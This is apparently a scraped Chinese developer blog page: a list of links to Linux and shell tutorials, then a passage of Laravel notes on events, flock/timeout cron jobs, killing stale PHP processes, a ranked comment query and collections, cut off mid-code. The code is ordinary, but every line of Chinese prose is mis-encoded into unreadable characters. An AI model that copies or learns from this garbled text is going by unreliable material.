<p><a href="https://learnku.com/linux/t/36233" target="_blank" rel="noopener">ä½¿ç”¨ fail2ban æ¥é˜²èŒƒ SSH æš´åŠ›ç ´è§£</a></p>
<p><a href="https://crontab.guru/" target="_blank" rel="noopener">åœ¨çº¿crontab</a></p>
<p><a href="https://github.com/jianyan74/dockerfiles" target="_blank" rel="noopener">docker å¿«é€Ÿæ­å»ºç¨³å®šå®‰å…¨çš„å¼€å‘/ç”Ÿäº§ç¯å¢ƒ</a></p>
<p><a href="https://gleehub.com/program/wsl-xia-you-ya-di-coding.html" target="_blank" rel="noopener">windows 10 WSLç¼–ç </a></p>
<p><a href="https://learnku.com/articles/33469" target="_blank" rel="noopener">åˆè¯† Shell</a></p>
<p><a href="http://einverne.github.io/post/2019/01/html-to-pdf.html" target="_blank" rel="noopener">html è½¬ pdf å‘½ä»¤è¡Œå·¥å…· wkhtmltopdf </a></p>
<p><a href="https://me.jinchuang.org/archives/301.html" target="_blank" rel="noopener">Centos7 æ­å»º Nextcloudä¸ªäººç½‘ç›˜</a></p>
<p><a href="https://github.com/mylxsw/growing-up/blob/master/doc/%E4%B8%89%E5%8D%81%E5%88%86%E9%92%9F%E5%AD%A6%E4%BC%9ASED.md" target="_blank" rel="noopener">ä¸‰ååˆ†é’Ÿå­¦ä¼šsed</a></p>
<p><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/index.html" target="_blank" rel="noopener">Linuxå·¥å…·å¿«é€Ÿæ•™ç¨‹</a></p>
<p><a href="http://qinghua.github.io/sed/" target="_blank" rel="noopener">çœ‹ä¾‹å­å­¦sed</a></p>
<p><a href="https://michael728.github.io/2018/07/05/linux-useful-commands-in-work/" target="_blank" rel="noopener">å·¥ä½œä¸­å¸¸ç”¨çš„ Linux å‘½ä»¤</a></p>
<p><a href="https://michael728.github.io/2019/04/14/linux-useful-shell-commands-in-work/" target="_blank" rel="noopener">å·¥ä½œä¸­å¸¸ç”¨çš„ Shell å‘½ä»¤åŠæŠ€å·§</a></p>
<p><a href="https://linux.hellocode.name/user-group.html" target="_blank" rel="noopener">PHPer å¿…çŸ¥å¿…ä¼šçš„ Linux å‘½ä»¤</a></p>
<p><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/index.html#" target="_blank" rel="noopener">Linuxå·¥å…·å¿«é€Ÿæ•™ç¨‹</a></p>
<p><a href="https://segmentfault.com/a/1190000016648034" target="_blank" rel="noopener">ä½ å¯èƒ½ä¸çŸ¥é“çš„shellæŠ€å·§</a></p>
<p><a href="https://neuqzxy.github.io/2017/07/08/wget%E7%9A%8415%E4%B8%AA%E9%9C%87%E6%92%BC%E7%9A%84%E4%BE%8B%E5%AD%90/" target="_blank" rel="noopener">wgetçš„15ä¸ªéœ‡æ’¼çš„ä¾‹å­</a></p>
<p><a href="https://www.restran.net/2015/10/19/linux-practice-notes/" target="_blank" rel="noopener">Linux è¸©å‘è®°</a></p>
<p><a href="https://github.com/Nick233333/phper-linux-gitbook" target="_blank" rel="noopener">PHPer å¿…çŸ¥å¿…ä¼šçš„ Linux å‘½ä»¤</a></p>
<p><a href="https://github.com/jlevy/the-art-of-command-line" target="_blank" rel="noopener">å‘½ä»¤è¡Œçš„è‰ºæœ¯</a></p>
<p><a href="https://www.njphper.com/posts/680ebdf2.html" target="_blank" rel="noopener">Nginx å­¦ä¹ ç¬”è®°æ—¶åºå›¾</a></p>
<p><a href="https://learnku.com/articles/28500" target="_blank" rel="noopener">Windows 10 å®‰è£…ä½“éªŒ</a></p>
<p><a href="https://coolshell.cn/articles/19219.html" target="_blank" rel="noopener">æ‰“é€ é«˜æ•ˆçš„å·¥ä½œç¯å¢ƒ â€“ SHELL ç¯‡https://github.com/coolshellx/articles</a></p>
<p><a href="https://michael728.github.io/2018/07/05/linux-useful-commands-in-work/" target="_blank" rel="noopener">å·¥ä½œä¸­å¸¸ç”¨çš„ Linux å‘½ä»¤</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/27/laravel-ç¬”è®°/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="è‹ç”Ÿä¸æƒ‘">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="è‹ç”Ÿä¸æƒ‘çš„åšå®¢">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/27/laravel-ç¬”è®°/" itemprop="url">laravel ç¬”è®°</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-03-27T19:44:44+08:00">
                2019-03-27
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">å­—æ•°ç»Ÿè®¡&#58;</span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  28.2k å­—
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  135 åˆ†é’Ÿ
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="äº‹ä»¶çš„ä½¿ç”¨Laravel-å¯åŠ¨æµç¨‹åˆ†æ"><a href="#äº‹ä»¶çš„ä½¿ç”¨Laravel-å¯åŠ¨æµç¨‹åˆ†æ" class="headerlink" title="äº‹ä»¶çš„ä½¿ç”¨Laravel å¯åŠ¨æµç¨‹åˆ†æ"></a>äº‹ä»¶çš„ä½¿ç”¨Laravel å¯åŠ¨æµç¨‹åˆ†æ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">php artisan make:event UserRegistered</span><br><span class="line"></span><br><span class="line">php artisan make:listener SendWelcomeMail --event=UserRegistered</span><br><span class="line"></span><br><span class="line">php artisan make:listener UpdateReferrer --event=UserRegistered</span><br><span class="line">protected $listen = [ </span><br><span class="line">    UserRegistered::<span class="function"><span class="params">class</span> =&gt;</span> [ </span><br><span class="line">        SendWelcomeMail::<span class="class"><span class="keyword">class</span>, </span></span><br><span class="line">        UpdateReferrer::class,</span><br><span class="line">    ]</span><br><span class="line">];</span><br><span class="line">https:<span class="comment">//learnku.com/articles/26152</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">boot</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        parent::boot();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span>::created(<span class="function"><span class="keyword">function</span> (<span class="params">User $user</span>) </span>&#123;</span><br><span class="line">            \event(<span class="keyword">new</span> UserRegistered($user));</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="cron-timeout"><a href="#cron-timeout" class="headerlink" title="cron timeout"></a>cron timeout</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">crontabå®šæ—¶å¯åŠ¨ä»»åŠ¡ï¼Œflockä¿è¯äº’æ–¥ï¼Œtimeoutè®¾ç½®è¶…æ—¶ä»¥åŠæŠ¥è­¦è„šæœ¬</span><br><span class="line">flock -xn /tmp/lock /path/to/php /path/to/file</span><br><span class="line">è®©æˆ‘ä»¬å†æ¥é‡æ”¾ä¸€ä¸‹æ•…éšœåœºæ™¯ï¼šå‡å¦‚ä¸Šä¸€åˆ†é’Ÿçš„ A è¯·æ±‚è¿˜æ²¡é€€å‡ºï¼Œä¸‹ä¸€åˆ†é’Ÿçš„ B è¯·æ±‚ä¹Ÿå¯åŠ¨äº†ï¼Œé‚£ä¹ˆ B è¯·æ±‚ä¼šå‘ç° A è¯·æ±‚è¿˜æ²¡æœ‰é‡Šæ”¾é”ï¼Œäºæ˜¯å®ƒä¸ä¼šæ‰§è¡Œã€‚</span><br><span class="line">å‡å¦‚å› ä¸ºæŸäº›æ— æ³•é¢„çŸ¥çš„åŸå› ï¼Œå¯¼è‡´è„šæœ¬ä¸èƒ½æ­£å¸¸ç»“æŸè¯·æ±‚ï¼Œè¿›è€Œå¯¼è‡´ä¸èƒ½æ­£å¸¸é‡Šæ”¾é”ï¼Œé‚£ä¹ˆåç»­æ‰€æœ‰å…¶å®ƒçš„ CD ç­‰è¯·æ±‚ä¹Ÿéƒ½æ— æ³•æ‰§è¡Œäº†ï¼Œå¦‚ä½•é¿å…ï¼Ÿç­”æ¡ˆæ˜¯ timeoutï¼Œå®ƒå®ç°äº†è¶…æ—¶æ§åˆ¶æœºåˆ¶ï¼š</span><br><span class="line">https:<span class="comment">//huoding.com/2016/12/12/573  https://juejin.im/post/5bb4fc0de51d450e597b6d51</span></span><br><span class="line">timeout -s SIGINT <span class="number">100</span> flock -xn /tmp/lock /path/to/php /path/to/file</span><br><span class="line">è®©æˆ‘ä»¬å†æ¥é‡æ”¾ä¸€ä¸‹æ•…éšœåœºæ™¯ï¼šå‡å¦‚ä¸Šä¸€åˆ†é’Ÿçš„ A è¯·æ±‚è¿˜æ²¡é€€å‡ºï¼Œä¸‹ä¸€åˆ†é’Ÿçš„ B è¯·æ±‚ä¹Ÿå¯åŠ¨äº†ï¼Œé‚£ä¹ˆ B è¯·æ±‚ä¼šå‘ç° A çš„è¯·æ±‚è¿˜æ²¡æœ‰é‡Šæ”¾é”ï¼Œäºæ˜¯å®ƒä¸ä¼šæ‰§è¡Œï¼Œä¸è¿‡ä¸‹ä¸‹åˆ†é’Ÿçš„ C è¯·æ±‚è‚¯å®šèƒ½æ‰§è¡Œï¼Œå› ä¸ºåœ¨è¿™ä¹‹å‰ï¼ŒA è¯·æ±‚å·²ç»å› ä¸ºè¶…æ—¶è¢« timeout å¹²æ‰äº†ã€‚</span><br><span class="line"></span><br><span class="line"># è¶…æ—¶å‘é€-9ä¿¡å·ï¼Œè¶…æ—¶æ‰§è¡Œåé¢çš„è„šæœ¬è¾“å‡ºfailed</span><br><span class="line">timeout -s <span class="number">9</span> <span class="number">5</span> sleep <span class="number">20</span> || echo <span class="string">'failed'</span></span><br><span class="line"># æœªè¶…æ—¶æ‰§è¡Œåé¢çš„è„šæœ¬è¾“å‡ºsuccess</span><br><span class="line">timeout -s <span class="number">9</span> <span class="number">10</span> sleep <span class="number">5</span> &amp;&amp; echo <span class="string">'success'</span></span><br><span class="line"> éœ€è¦æ³¨æ„çš„ç‚¹</span><br><span class="line"></span><br><span class="line">timeout æ­£å¸¸ç»“æŸçš„è¿”å›ç æ˜¯<span class="number">0</span></span><br><span class="line">timeout è¶…æ—¶killç»“æŸçš„è¿”å›ç æ˜¯<span class="number">124</span></span><br><span class="line"></span><br><span class="line"> å‡è®¾<span class="number">6</span>åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ä¸”äº’æ–¥éé˜»å¡ï¼Œè¶…æ—¶<span class="number">10</span>åˆ†é’Ÿä¸”è¶…æ—¶æ‰§è¡ŒæŠ¥è­¦è„šæœ¬ï¼Œåˆ™æœ€ç»ˆcrontabæ–‡ä»¶å¦‚ä¸‹</span><br><span class="line"> *<span class="regexp">/6 * * * * cd /</span>data/projec &amp;&amp; flock -xn ./task.lock -c <span class="string">'timeout -9 600 sh task.sh || sh alarm.sh'</span></span><br><span class="line"> éœ€è¦æ³¨æ„çš„ç‚¹</span><br><span class="line"> å¦‚æœtask.shå¯åŠ¨äº†å­è¿›ç¨‹è¿›è¡Œå¤„ç†ï¼Œåˆ™éœ€è¦åœ¨task.shçš„æœ«å°¾åŠ ä¸Šwaitå‘½ä»¤ç­‰å¾…å…¨éƒ¨å­è¿›ç¨‹å®Œæˆæ‰ç»“æŸï¼Œå¦åˆ™timeoutæ— æ•ˆ</span><br><span class="line"> cd /data/project</span><br><span class="line"> nohub python3 main.py &gt;main.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> &amp;</span><br><span class="line"> wait</span><br><span class="line"> https:<span class="comment">//juejin.im/post/5bb4fc0de51d450e597b6d51</span></span><br></pre></td></tr></table></figure>
<h3 id="æ€æ­»è¿‡æœŸè¿›ç¨‹"><a href="#æ€æ­»è¿‡æœŸè¿›ç¨‹" class="headerlink" title="æ€æ­»è¿‡æœŸè¿›ç¨‹"></a>æ€æ­»è¿‡æœŸè¿›ç¨‹</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">fire</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $pids = $<span class="keyword">this</span>-&gt;getPids([<span class="string">"php"</span>, <span class="string">"shell_lock"</span>]);</span><br><span class="line">            foreach ($pids <span class="keyword">as</span> $pid) &#123;</span><br><span class="line">                $startTime = $<span class="keyword">this</span>-&gt;getProcessStartTime($pid);</span><br><span class="line">                $<span class="keyword">this</span>-&gt;ifKill($startTime, $pid);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception $e) &#123;</span><br><span class="line">            Log::error(<span class="string">"["</span> . ClientIp::getIp() . <span class="string">"][LONG TIME KILLER]: "</span> . $e-&gt;getMessage() . <span class="string">"\r\n"</span> . $e-&gt;getTraceAsString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">getPids</span>(<span class="params">$arr</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $command = <span class="string">"ps aux | grep -v grep "</span>;</span><br><span class="line">        foreach ($arr <span class="keyword">as</span> $word) &#123;</span><br><span class="line">            $command .= <span class="string">"| grep &#123;$word&#125;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $command .= <span class="string">" | awk '&#123;print $2&#125;'"</span>;</span><br><span class="line">        $result = shell_exec($command);</span><br><span class="line">        $result = trim($result);</span><br><span class="line">        <span class="keyword">if</span> (empty($result)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> explode(<span class="string">"\n"</span>, $result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">getProcessStartTime</span>(<span class="params">$pid</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/*ps -p 18994 -o lstart</span></span><br><span class="line"><span class="comment">                           STARTED</span></span><br><span class="line"><span class="comment">          Thu Mar 21 10:25:38 2019</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        $command = <span class="string">"ps -p &#123;$pid&#125; -o lstart"</span>;</span><br><span class="line">        $result = shell_exec($command);</span><br><span class="line">        $result = trim(str_replace(<span class="string">"STARTED"</span>, <span class="string">""</span>, $result));</span><br><span class="line">        <span class="keyword">if</span> (empty($result)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $ctime = \Carbon\Carbon::createFromFormat(<span class="string">"D M j H:i:s Y"</span>, $result);</span><br><span class="line">        <span class="keyword">return</span> $ctime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">ifKill</span>(<span class="params">Carbon $ctime, $pid</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($ctime-&gt;lt(\Carbon\Carbon::now()-&gt;addHours(<span class="number">-1</span>))) &#123;</span><br><span class="line">            $cmd = file_get_contents(<span class="string">"/proc/&#123;$pid&#125;/cmdline"</span>);</span><br><span class="line">            $logString =   Carbon::now()-&gt;toDateTimeString() . <span class="string">"]Killing pid &#123;$pid&#125; started at "</span> . $ctime-&gt;toDateTimeString() . <span class="string">" lasts for more than 1 hour, start script is `"</span> . $cmd . <span class="string">"`"</span>;</span><br><span class="line">            \Log::info($logString);</span><br><span class="line">            shell_exec(<span class="string">"kill -9 &#123;$pid&#125;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pid <span class="keyword">in</span> $(ps aux|grep <span class="string">'artisan   '</span> | grep -v grep | awk <span class="string">'&#123;print $2&#125;'</span>); <span class="keyword">do</span> kill <span class="number">-9</span> $pid; done</span><br><span class="line">ps -ef | pgrep -f <span class="string">"search"</span> | xargs kill <span class="number">-9</span></span><br></pre></td></tr></table></figure>
<h3 id="æ¯ä¸ªæ–‡ç« çš„å‰10æ¡è¯„è®ºä¸€åŒæŸ¥è¯¢å‡ºæ¥"><a href="#æ¯ä¸ªæ–‡ç« çš„å‰10æ¡è¯„è®ºä¸€åŒæŸ¥è¯¢å‡ºæ¥" class="headerlink" title="æ¯ä¸ªæ–‡ç« çš„å‰10æ¡è¯„è®ºä¸€åŒæŸ¥è¯¢å‡ºæ¥"></a>æ¯ä¸ªæ–‡ç« çš„å‰10æ¡è¯„è®ºä¸€åŒæŸ¥è¯¢å‡ºæ¥</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$posts = Post::paginate(<span class="number">15</span>);</span><br><span class="line"></span><br><span class="line">$postIds = $posts-&gt;pluck(<span class="string">'id'</span>)-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ‰¾å‡ºç¬¦åˆæ¡ä»¶çš„ comments ï¼ŒåŒæ—¶å®šä¹‰ @post, @rank å˜é‡ï¼Œè¿™é‡Œæ²¡æœ‰ç”¨ all,get ç­‰å‡½æ•°ï¼Œæ­¤æ—¶å¹¶ä¸ä¼šæ‰§è¡Œ SQL è¯­å¥ã€‚</span></span><br><span class="line">$sub = Comment::whereIn(<span class="string">'post_id'</span>,$postIds)-&gt;select(DB::raw(<span class="string">'*,@post := NULL ,@rank := 0'</span>))-&gt;orderBy(<span class="string">'post_id'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//æŠŠä¸Šé¢æ„é€ çš„ sql æŸ¥è¯¢ä½œä¸ºå­è¡¨è¿›è¡ŒæŸ¥è¯¢ï¼Œæ ¹æ® post_id è¿›è¡Œåˆ†åŒºçš„åŒæ—¶ @rank å˜é‡ä¸æ–­+1</span></span><br><span class="line">$sub2 = DB::table( DB::raw(<span class="string">"(&#123;$sub-&gt;toSql()&#125;) as b"</span>) )</span><br><span class="line">            -&gt;mergeBindings($sub-&gt;getQuery())</span><br><span class="line">            -&gt;select(DB::raw(<span class="string">'b.*,IF (</span></span><br><span class="line"><span class="string">            @post = b.post_id ,@rank :=@rank + 1 ,@rank := 1</span></span><br><span class="line"><span class="string">        ) AS rank,</span></span><br><span class="line"><span class="string">        @post := b.post_id'</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//å–å‡ºç¬¦åˆæ¡ä»¶çš„å‰10æ¡comment</span></span><br><span class="line">$commentIds = DB::table( DB::raw(<span class="string">"(&#123;$sub2-&gt;toSql()&#125;) as c"</span>) )</span><br><span class="line">            -&gt;mergeBindings($sub2)</span><br><span class="line">        -&gt;where(<span class="string">'rank'</span>,<span class="string">'&lt;'</span>,<span class="number">11</span>)-&gt;select(<span class="string">'c.id'</span>)-&gt;pluck(<span class="string">'id'</span>)-&gt;toArray();</span><br><span class="line"></span><br><span class="line">$comments = Comment::whereIn(<span class="string">'id'</span>,$commentIds)-&gt;get();</span><br><span class="line"></span><br><span class="line">$posts = $posts-&gt;each(<span class="function"><span class="keyword">function</span> (<span class="params">$item, $key</span>) <span class="title">use</span> (<span class="params">$comments</span>) </span>&#123;</span><br><span class="line">    $item-&gt;comments = $comments-&gt;where(<span class="string">'post_id'</span>,$item-&gt;id);</span><br><span class="line">&#125;);</span><br><span class="line">ä¼šäº§ç”Ÿä¸‰æ¡sql https:<span class="comment">//learnku.com/articles/20315</span></span><br><span class="line">select * <span class="keyword">from</span> <span class="string">`posts`</span> limit <span class="number">15</span> offset <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">select <span class="string">`c`</span>.<span class="string">`id`</span> <span class="keyword">from</span> (select b.*,IF (</span><br><span class="line">@post = b.post_id ,@rank :=@rank + <span class="number">1</span> ,@rank := <span class="number">1</span></span><br><span class="line">) AS rank,</span><br><span class="line">@post := b.post_id <span class="keyword">from</span> (select *,@post := NULL ,@rank := <span class="number">0</span> <span class="keyword">from</span> <span class="string">`comments`</span> where <span class="string">`post_id`</span> <span class="keyword">in</span> (<span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'10'</span>, <span class="string">'11'</span>, <span class="string">'12'</span>, <span class="string">'13'</span>, <span class="string">'14'</span>, <span class="string">'15'</span>, <span class="string">'16'</span>) order by <span class="string">`post_id`</span> asc) <span class="keyword">as</span> b) <span class="keyword">as</span> c where <span class="string">`rank`</span> &lt; <span class="string">'11'</span>;</span><br><span class="line"></span><br><span class="line">select * <span class="keyword">from</span> <span class="string">`comments`</span> where <span class="string">`id`</span> <span class="keyword">in</span> (<span class="string">'180'</span>, <span class="string">'589'</span>, <span class="string">'590'</span>, <span class="string">'3736'</span>);</span><br></pre></td></tr></table></figure>
<h3 id="Laravel-é›†åˆ"><a href="#Laravel-é›†åˆ" class="headerlink" title="Laravel é›†åˆ"></a>Laravel é›†åˆ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//learnku.com/laravel/t/26110</span></span><br><span class="line"></span><br><span class="line">  $users = User::all();</span><br><span class="line">        $users-&gt;contains(<span class="string">'name'</span>, <span class="string">'Chasity Tillman'</span>);</span><br><span class="line">        <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line">        $collection = collect([<span class="string">'name'</span> =&gt; <span class="string">'John'</span>, <span class="string">'age'</span> =&gt; <span class="number">23</span>]);</span><br><span class="line">        $collection-&gt;contains(<span class="string">'Jane'</span>);</span><br><span class="line">        <span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">        $collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line">        $collection-&gt;contains(<span class="function"><span class="keyword">function</span> (<span class="params">$key, $value</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $value &lt;= <span class="number">5</span>;</span><br><span class="line">            <span class="comment">//true</span></span><br><span class="line">        